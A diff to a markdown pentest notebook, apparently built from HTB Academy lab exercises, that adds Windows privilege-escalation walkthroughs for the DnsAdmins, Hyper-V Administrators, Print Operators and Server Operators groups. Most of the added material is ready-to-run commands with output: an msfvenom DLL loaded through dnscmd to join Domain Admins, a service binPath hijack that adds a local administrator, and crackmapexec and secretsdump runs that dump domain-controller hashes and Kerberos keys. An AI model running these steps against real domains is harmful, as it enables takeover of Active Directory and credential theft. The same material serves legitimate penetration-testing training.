@@ -246,7 +246,7 @@ Get-NetGroupMember -Identity "Domain Admins" -Recurse
 [Enterprise Admins](https://learn.microsoft.com/en-us/windows-server/identity/ad-ds/manage/understand-security-groups#enterprise-admins)
 can control everything across every domain in the entire forest
 
-Enterprise Admins exist only in the root domain of an
+**Enterprise Admins** exist only in the root domain of an
 [[Active Directory]] forest of domains
 
 <!-- Actions {{{-->
@@ -767,7 +767,7 @@ hashcat -m 1000 <ntlm_hash> /usr/share/wordlists/rockyou.txt
 ### DnsAdmins
 
 [DnsAdmins](https://learn.microsoft.com/en-us/windows-server/identity/ad-ds/manage/understand-security-groups#dnsadmins)
-have access to network DNS information
+have access to DNS information on the network
 
 <!-- Actions {{{-->
 > [!tip]- Actions
@@ -783,6 +783,375 @@ have access to network DNS information
 Get-NetGroupMember -Identity "DnsAdmins" -Recurse
 ```
 
+**DNSADMIN ACCESS WITH CUSTOM DLL**
+
+Generate a malicious DLL to add a user to the `domain admins` group
+
+The [[DNS/General|DNS]] service runs as `NT AUTHORITY\SYSTEM`
+that can be leveraged to escalate privileges on a [[Domain Controller]]
+
+<!-- Danger {{{-->
+> [!danger]
+>
+> [[DNS/General|DNS]] may be taken down
+> for the entire [[Active Directory]] environment
+<!-- }}} -->
+
+<!-- Attack Overview {{{-->
+> [!tip]- Attack Overview
+>
+> - DNS management is performed over RPC
+> - `ServerLevelPluginDll` loads a custom DLL with zero verification
+>   of the DLL's path
+> - When a member of the [[#DnsAdmins]] group runs the `dnscmd` command,
+>   the `HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\services\DNS\Parameters\ServerLevelPluginDll`
+>   registry key is populated
+> - When the DNS service is restarted, the DLL in this path will be loaded
+>   (*i.e., a network share that the [[Domain Controller]]'s machine account
+>   can access)
+> - An attacker can load a custom DLL to obtain a reverse shell
+>   or even [[Mimikatz]] to dump credentials
+<!-- }}} -->
+
+1. [Get-ADGroupMember](https://learn.microsoft.com/en-us/powershell/module/activedirectory/get-adgroupmember?view=windowsserver2025-ps) —
+Confirm `DnsAdmins` group membership
+
+```powershell
+Get-ADGroupMember -Identity DnsAdmins
+```
+
+<!-- Example {{{-->
+> [!example]-
+>
+> ```powershell
+> C:\htb> Get-ADGroupMember -Identity DnsAdmins
+> ```
+>
+> ```powershell
+> distinguishedName : CN=netadm,CN=Users,DC=INLANEFREIGHT,DC=LOCAL
+> name              : netadm
+> objectClass       : user
+> objectGUID        : 1a1ac159-f364-4805-a4bb-7153051a8c14
+> SamAccountName    : netadm
+> SID               : S-1-5-21-669053619-2741956077-1013132368-1109           
+> ```
+<!-- }}} -->
+
+2. [[Msfvenom]] — Create malicious DLL
+
+```sh
+msfvenom -p windows/x64/exec cmd='net group "domain admins" netadm /add /domain' -f dll -o adduser.dll
+```
+
+<!-- Example {{{-->
+> [!example]-
+> ```sh
+> msfvenom -p windows/x64/exec cmd='net group "domain admins" netadm /add /domain' -f dll -o adduser.dll
+> ```
+>
+> ```sh
+> [-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
+> [-] No arch selected, selecting arch: x64 from the payload
+> No encoder specified, outputting raw payload
+> Payload size: 313 bytes
+> Final size of dll file: 5120 bytes
+> Saved as: adduser.dll
+> ```
+<!-- }}} -->
+
+3. [[Windows/Download|Download]] the file to the target
+
+
+4. [dnscmd](https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/dnscmd) —
+   Load DLL as a member of `DnsAdmins` to the [[Registry]]
+   without verification
+
+<!-- Tip {{{-->
+> [!tip]-
+>
+> It is also possible to load [[Mimikatz]] to dump credentials
+<!-- }}} -->
+
+```powershell
+dnscmd.exe /config /serverlevelplugindll C:\Users\netadm\Desktop\adduser.dll
+```
+
+<!-- Example {{{-->
+> [!example]-
+>
+> ```powershell
+> C:\htb> dnscmd.exe /config /serverlevelplugindll C:\Users\netadm\Desktop\adduser.dll
+> ```
+>
+> ```powershell
+> Registry property serverlevelplugindll successfully reset.
+> Command completed successfully.
+> ```
+<!-- }}} -->
+
+<!-- Warning {{{-->
+> [!warning]
+>
+> The path to the DLL needs to be specified explicitly
+>
+<!-- }}} -->
+
+<!-- Warning {{{-->
+> [!warning]
+>
+> Loading the DLL as non-privileged user result in an error
+>
+> <!-- Example {{{-->
+> > [!example]-
+> >
+> > ```powershell
+> > C:\htb> dnscmd.exe /config /serverlevelplugindll C:\Users\netadm\Desktop\adduser.dll
+> > ```
+> >
+> > ```powershell
+> >
+> > DNS Server failed to reset registry property.
+> >     Status = 5 (0x00000005)
+> > Command failed: ERROR_ACCESS_DENIED
+> > ```
+> <!-- }}} -->
+<!-- }}} -->
+
+5. Find a user's `SID`
+
+```powershell
+wmic useraccount where name="netadm" get sid
+```
+
+<!-- Example {{{-->
+> [!example]-
+>
+> ```powershell
+> C:\htb> wmic useraccount where name="netadm" get sid
+> ```
+>
+> ```powershell
+> SID
+> S-1-5-21-669053619-2741956077-1013132368-1109
+> ```
+<!-- }}} -->
+
+6. [sc](https://learn.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2012-r2-and-2012/cc754599(v=ws.11)) —
+Check [service permissions](https://www.winhelponline.com/blog/view-edit-service-permissions-windows/)
+(*`SERVICE_START` & `SERVICE_STOP`*)
+
+```powershell
+sc.exe sdshow DNS
+```
+
+<!-- Example {{{-->
+> [!example]-
+>
+> ```powershell
+> C:\htb> sc.exe sdshow DNS
+> ```
+>
+> ```powershell
+> D:(A;;CCLCSWLOCRRC;;;IU)(A;;CCLCSWLOCRRC;;;SU)(A;;CCLCSWRPWPDTLOCRRC;;;SY)(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;BA)(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;SO)(A;;RPWP;;;S-1-5-21-669053619-2741956077-1013132368-1109)S:(AU;FA;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;WD)
+> ```
+<!-- }}} -->
+
+7. [sc](https://learn.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2012-r2-and-2012/cc754599(v=ws.11)) —
+Stop and start the DNS service
+
+```powershell
+sc stop dns
+```
+
+<!-- Example {{{-->
+> [!example]-
+>
+> ```powershell
+> C:\htb> sc stop dns
+> ```
+>
+> ```powershell
+> SERVICE_NAME: dns
+>         TYPE               : 10  WIN32_OWN_PROCESS
+>         STATE              : 3  STOP_PENDING
+>                                 (STOPPABLE, PAUSABLE, ACCEPTS_SHUTDOWN)
+>         WIN32_EXIT_CODE    : 0  (0x0)
+>         SERVICE_EXIT_CODE  : 0  (0x0)
+>         CHECKPOINT         : 0x1
+>         WAIT_HINT          : 0x7530
+> ```
+<!-- }}} -->
+
+```powershell
+sc start dns
+```
+
+<!-- Example {{{-->
+> [!example]-
+>
+> ```powershell
+> C:\htb> sc start dns
+> ```
+>
+> ```powershell
+> SERVICE_NAME: dns
+>         TYPE               : 10  WIN32_OWN_PROCESS
+>         STATE              : 2  START_PENDING
+>                                 (NOT_STOPPABLE, NOT_PAUSABLE, IGNORES_SHUTDOWN)
+>         WIN32_EXIT_CODE    : 0  (0x0)
+>         SERVICE_EXIT_CODE  : 0  (0x0)
+>         CHECKPOINT         : 0x0
+>         WAIT_HINT          : 0x7d0
+>         PID                : 6960
+>         FLAGS              :
+> ```
+<!-- }}} -->
+
+> [!warning]
+>
+> The DNS service may fail to start with the custom DLL
+
+8. Confirm group membership
+
+```powershell
+net group "Domain Admins" /dom
+```
+
+<!-- Example {{{-->
+> [!example]-
+>
+> ```powershell
+> C:\htb> net group "Domain Admins" /dom
+> ```
+>
+> ```powershell
+> Group name     Domain Admins
+> Comment        Designated administrators of the domain
+>
+> Members
+>
+> -------------------------------------------------------------------------------
+> Administrator            netadm
+> The command completed successfully.
+> ```
+<!-- }}} -->
+
+**Clean-Up**
+
+<!-- Warning {{{-->
+> [!warning]
+>
+> The steps must be taken from an elevated console with a local
+> or domain admin account
+<!-- }}} -->
+
+1. Confirm added key to the [[Registry]]
+
+```powershell
+reg query \\10.129.43.9\HKLM\SYSTEM\CurrentControlSet\Services\DNS\Parameters
+```
+
+<!-- Example {{{-->
+> [!example]-
+>
+> ```powershell
+> C:\htb> reg query \\10.129.43.9\HKLM\SYSTEM\CurrentControlSet\Services\DNS\Parameters
+> ```
+>
+> ```powershell
+> HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\DNS\Parameters
+>     GlobalQueryBlockList    REG_MULTI_SZ    wpad\0isatap
+>     EnableGlobalQueryBlockList    REG_DWORD    0x1
+>     PreviousLocalHostname    REG_SZ    WINLPE-DC01.INLANEFREIGHT.LOCAL
+>     Forwarders    REG_MULTI_SZ    1.1.1.1\08.8.8.8
+>     ForwardingTimeout    REG_DWORD    0x3
+>     IsSlave    REG_DWORD    0x0
+>     BootMethod    REG_DWORD    0x3
+>     AdminConfigured    REG_DWORD    0x1
+>     ServerLevelPluginDll    REG_SZ    adduser.dll
+> ```
+<!-- }}} -->
+
+2. Delete registry key
+
+```powershell
+reg delete \\10.129.43.9\HKLM\SYSTEM\CurrentControlSet\Services\DNS\Parameters  /v ServerLevelPluginDll
+```
+
+<!-- Example {{{-->
+> [!example]-
+>
+> ```powershell
+> C:\htb> reg delete \\10.129.43.9\HKLM\SYSTEM\CurrentControlSet\Services\DNS\Parameters  /v ServerLevelPluginDll
+> ```
+>
+> ```powershell
+> Delete the registry value ServerLevelPluginDll (Yes/No)? Y
+> The operation completed successfully.
+> ```
+<!-- }}} -->
+
+3. Start the [[DNS/General|DNS]] service
+
+```powershell
+C:\htb> sc.exe start dns
+```
+
+<!-- Example {{{-->
+> [!example]-
+>
+> ```powershell
+> C:\htb> sc.exe start dns
+> ```
+>
+> ```powershell
+> SERVICE_NAME: dns
+>         TYPE               : 10  WIN32_OWN_PROCESS
+>         STATE              : 2  START_PENDING
+>                                 (NOT_STOPPABLE, NOT_PAUSABLE, IGNORES_SHUTDOWN)
+>         WIN32_EXIT_CODE    : 0  (0x0)
+>         SERVICE_EXIT_CODE  : 0  (0x0)
+>         CHECKPOINT         : 0x0
+>         WAIT_HINT          : 0x7d0
+>         PID                : 4984
+>         FLAGS              :
+> ```
+<!-- }}} -->
+
+4. Check service status
+
+```powershell
+sc query dns
+```
+
+<!-- Example {{{-->
+> [!example]-
+>
+> ```powershell
+> C:\htb> sc query dns
+> ```
+>
+> ```powershell
+> SERVICE_NAME: dns
+>         TYPE               : 10  WIN32_OWN_PROCESS
+>         STATE              : 4  RUNNING
+>                                 (STOPPABLE, PAUSABLE, ACCEPTS_SHUTDOWN)
+>         WIN32_EXIT_CODE    : 0  (0x0)
+>         SERVICE_EXIT_CODE  : 0  (0x0)
+>         CHECKPOINT         : 0x0
+>         WAIT_HINT          : 0x0
+> ```
+<!-- }}} -->
+
+**REVERSE SHELL**
+
+[mimilib.dll](https://github.com/gentilkiwi/mimikatz/tree/master/mimilib) —
+[Gain command execution](https://www.labofapenetrationtester.com/2017/05/abusing-dnsadmins-privilege-for-escalation-in-active-directory.html)
+
+1. Modify the [kdns.c](https://github.com/gentilkiwi/mimikatz/blob/master/mimilib/kdns.c)
+   file to execute a PowerShell [reverse shell](https://www.revshells.com/)
+
+
 <!-- }}} -->
 
 <!-- Event Log Readers {{{-->
@@ -793,6 +1162,10 @@ can read Event Logs from local computers
 
 ```powershell
 Get-NetGroupMember -Identity "Event Log Readers" -Recurse
+```
+
+```powershell
+net localgroup "Event Log Readers"
 ```
 
 1. Query Windows Events
@@ -864,21 +1237,62 @@ Get-WinEvent -FilterHashtable @{LogName='Security'; Id=4688} |
 have complete and unrestricted access to all the features in
 [Hyper-V](https://en.wikipedia.org/wiki/Hyper-V)
 
+<!-- Warning {{{-->
+> [!warning]
+>
+> This vector has been mitigeated by the March 2020
+> Windows security update
+<!-- }}} -->
+
+<!-- Warning - Domain Controllers {{{-->
+> [!warning]- Domain Controllers
+>
+> If a [[Domain Controller]] is virtualized, `Hyper-V Administrators`
+> should be considered [[#Domain Admins]]
+>
+> A [[Domain Controller]]s can be cloned and mounted as a virtual disk
+> to obtain the `NTDS.dit` file 
+<!-- }}} -->
+
 ```powershell
 Get-NetGroupMember -Identity "Hypr-V Administrators" -Recurse
 ```
 
-1. Take ownership
+1. Update the [POC](https://raw.githubusercontent.com/decoder-it/Hyper-V-admin-EOP/master/hyperv-eop.ps1)
+   to grant full permissions
 
-```
-takeown /F C:\<file>
+```powershell
+.\hyperv-eop.ps1
 ```
 
+1. Take ownership of a file
+   (*e.g. Mozilla Maintenance Service*)
+
+```sh
+takeown /F C:\Program Files (x86)\Mozilla Maintenance Service\maintenanceservice.exe
+```
+
+<!-- Example {{{-->
 > [!example]-
 >
-> ```
+> ```sh
 > C:\htb> takeown /F C:\Program Files (x86)\Mozilla Maintenance Service\maintenanceservice.exe
 > ```
+<!-- }}} -->
+
+2. Start Mozilla Maintenance Service
+
+```sh
+sc.exe start MozillaMaintenance
+```
+
+<!-- Example {{{-->
+> [!example]-
+>
+> ```sh
+> C:\htb> sc.exe start MozillaMaintenance
+> ```
+<!-- }}} -->
 
 <!-- }}} -->
 
@@ -886,12 +1300,40 @@ takeown /F C:\<file>
 ### Print Operators
 
 [Print Operators](https://learn.microsoft.com/en-us/windows-server/identity/ad-ds/manage/understand-security-groups#print-operators)
-can manage, create, share, and delete printers
-that are connected to a [[Domain Controller]] in the domain
+can log in to a [[Domain Controller]] and manage,
+create, share, and delete printers connected to it
 
 ```powershell
 Get-NetGroupMember -Identity "Print Operators" -Recurse
 ```
+
+1. Confirm privileges
+
+If `SeLoadDriverPrivileges` is not present,
+[[UAC]] needs to be bypassed
+
+```sh
+whoami /priv
+```
+
+<!-- Example {{{-->
+> [!example]-
+>
+> ```sh
+> C:\htb> whoami /priv
+> ```
+>
+> ```sh
+> PRIVILEGES INFORMATION
+> ----------------------
+>
+> Privilege Name           Description                          State
+> ======================== =================================    =======
+> SeIncreaseQuotaPrivilege Adjust memory quotas for a process   Disabled
+> SeChangeNotifyPrivilege  Bypass traverse checking             Enabled
+> SeShutdownPrivilege      Shut down the system                 Disabled
+> ```
+<!-- }}} -->
 
 <!-- }}} -->
 
@@ -899,8 +1341,10 @@ Get-NetGroupMember -Identity "Print Operators" -Recurse
 ### Server Operators
 
 [Server Operators](https://learn.microsoft.com/en-us/windows-server/identity/ad-ds/manage/understand-security-groups#server-operators)
+can administer a [[Domain Controller]]
 
-Members can administer a [[Domain Controller]]
+**Server Operators** grants [[Privileges#SeBackupPrivilege|SeBackupPrivilege]]
+and [[Privileges#SeRestorePrivilege|SeRestorePrivilege]]
 
 <!-- Actions {{{-->
 > [!tip]- Actions
@@ -918,6 +1362,239 @@ Members can administer a [[Domain Controller]]
 ```powershell
 Get-NetGroupMember -Identity "Server Operators" -Recurse
 ```
+
+1. Query the `Appreadiness` service
+
+```sh
+sc qc Appreadiness
+```
+
+<!-- Example {{{-->
+> [!example]-
+>
+> ```sh
+> C:\htb> sc qc AppReadiness
+> ```
+> ```sh
+> [SC] QueryServiceConfig SUCCESS
+>
+> SERVICE_NAME: AppReadiness
+>         TYPE               : 20  WIN32_SHARE_PROCESS
+>         START_TYPE         : 3   DEMAND_START
+>         ERROR_CONTROL      : 1   NORMAL
+>         BINARY_PATH_NAME   : C:\Windows\System32\svchost.exe -k AppReadiness -p
+>         LOAD_ORDER_GROUP   :
+>         TAG                : 0
+>         DISPLAY_NAME       : App Readiness
+>         DEPENDENCIES       :
+>         SERVICE_START_NAME : LocalSystem
+> ```
+<!-- }}} -->
+
+2. [PsService](https://learn.microsoft.com/en-us/sysinternals/downloads/psservice) —
+Check permissions on the service
+
+[[#Server Operators]] should have [SERVICE_ALL_ACCESS](https://learn.microsoft.com/en-us/windows/win32/services/service-security-and-access-rights)
+rights
+
+```sh
+C:\PsService.exe security AppReadiness
+```
+
+<!-- Example {{{-->
+> [!example]-
+>
+> ```sh
+> C:\htb> c:\Tools\PsService.exe security AppReadiness
+> ```
+> ```sh
+> PsService v2.25 - Service information and configuration utility
+> Copyright (C) 2001-2010 Mark Russinovich
+> Sysinternals - www.sysinternals.com
+>
+> SERVICE_NAME: AppReadiness
+> DISPLAY_NAME: App Readiness
+>         ACCOUNT: LocalSystem
+>         SECURITY:
+>         [ALLOW] NT AUTHORITY\SYSTEM
+>                 Query status
+>                 Query Config
+>                 Interrogate
+>                 Enumerate Dependents
+>                 Pause/Resume
+>                 Start
+>                 Stop
+>                 User-Defined Control
+>                 Read Permissions
+>         [ALLOW] BUILTIN\Administrators
+>                 All
+>         [ALLOW] NT AUTHORITY\INTERACTIVE
+>                 Query status
+>                 Query Config
+>                 Interrogate
+>                 Enumerate Dependents
+>                 User-Defined Control
+>                 Read Permissions
+>         [ALLOW] NT AUTHORITY\SERVICE
+>                 Query status
+>                 Query Config
+>                 Interrogate
+>                 Enumerate Dependents
+>                 User-Defined Control
+>                 Read Permissions
+>         [ALLOW] BUILTIN\Server Operators
+>                 All
+> ```
+<!-- }}} -->
+
+3. Check Local Admin group membership
+
+Confirm that target account is not present
+
+```sh
+net localgroup Administrators
+```
+
+<!-- Example {{{-->
+> [!example]-
+>
+> ```sh
+> C:\htb> net localgroup Administrators
+> ```
+>
+> ```sh
+> Alias name     Administrators
+> Comment        Administrators have complete and unrestricted access to the computer/domain
+>
+> Members
+>
+> -------------------------------------------------------------------------------
+> Administrator
+> Domain Admins
+> Enterprise Admins
+> The command completed successfully.
+> ```
+<!-- }}} -->
+
+4. Modify the service binary path
+
+Change the binary path to execute a command which adds
+the current user to the default local administrators group
+
+```sh
+sc config AppReadiness binPath= "cmd /c net localgroup Administrators server_adm /add"
+```
+
+<!-- Example {{{-->
+> [!example]-
+>
+> ```sh
+> C:\htb> sc config AppReadiness binPath= "cmd /c net localgroup Administrators server_adm /add"
+> ```
+>
+> ```sh
+> [SC] ChangeServiceConfig SUCCESS
+> ```
+<!-- }}} -->
+
+5. Start the service
+
+```sh
+sc start AppReadiness
+```
+
+<!-- Example {{{-->
+> [!example]-
+>
+> ```sh
+> C:\htb> sc start AppReadiness
+> ```
+>
+> ```sh
+> [SC] StartService FAILED 1053:
+>
+> The service did not respond to the start or control request in a timely fashion.
+> ```
+<!-- }}} -->
+
+6. Confirm Local Admin group membership
+
+```sh
+net localgroup Administrators
+```
+
+<!-- Example {{{-->
+> [!example]-
+>
+> ```sh
+> C:\htb> net localgroup Administrators
+> ```
+> ```sh
+> Alias name     Administrators
+> Comment        Administrators have complete and unrestricted access to the computer/domain
+>
+> Members
+>
+> -------------------------------------------------------------------------------
+> Administrator
+> Domain Admins
+> Enterprise Admins
+> server_adm
+> The command completed successfully.
+> ```
+<!-- }}} -->
+
+7. Confirm Local Admin access on [[Domain Controller]]
+
+Full control over the [[Domain Controller]] allows to
+- Retrieve credentials from the NTDS database
+- Access other systems
+- Perform post-exploitation tasks
+
+```sh
+crackmapexec smb 10.129.43.9 -u server_adm -p 'HTB_@cademy_stdnt!'
+```
+
+<!-- Example {{{-->
+> [!example]-
+>
+> ```sh
+> MarciPwns@htb[/htb]$ crackmapexec smb 10.129.43.9 -u server_adm -p 'HTB_@cademy_stdnt!'
+> ```
+>
+> ```sh
+> SMB         10.129.43.9     445    WINLPE-DC01      [*] Windows 10.0 Build 17763 (name:WINLPE-DC01) (domain:INLANEFREIGHT.LOCAL) (signing:True) (SMBv1:False)
+> SMB         10.129.43.9     445    WINLPE-DC01      [+] INLANEFREIGHT.LOCAL\server_adm:HTB_@cademy_stdnt! (Pwn3d!)
+> ```
+<!-- }}} -->
+
+8. Retrieve NTLM password hashes from the [[Domain Controller]]
+
+```sh
+secretsdump.py server_adm@10.129.43.9 -just-dc-user administrator
+```
+
+<!-- Example {{{-->
+> [!example]-
+>
+> ```sh
+> secretsdump.py server_adm@10.129.43.9 -just-dc-user administrator
+> ```
+>
+> ```sh
+> Impacket v0.9.22.dev1+20200929.152157.fe642b24 - Copyright 2020 SecureAuth Corporation
+>
+> Password:
+> [*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
+> [*] Using the DRSUAPI method to get NTDS.DIT secrets
+> Administrator:500:aad3b435b51404eeaad3b435b51404ee:cf3a5525ee9414229e66279623ed5c58:::
+> [*] Kerberos keys grabbed
+> Administrator:aes256-cts-hmac-sha1-96:5db9c9ada113804443a8aeb64f500cd3e9670348719ce1436bcc95d1d93dad43
+> Administrator:aes128-cts-hmac-sha1-96:94c300d0e47775b407f2496a5cca1a0a
+> Administrator:des-cbc-md5:d60dfbbf20548938
+> [*] Cleaning up...
+> ```
+<!-- }}} -->
 
 <!-- }}} -->
 
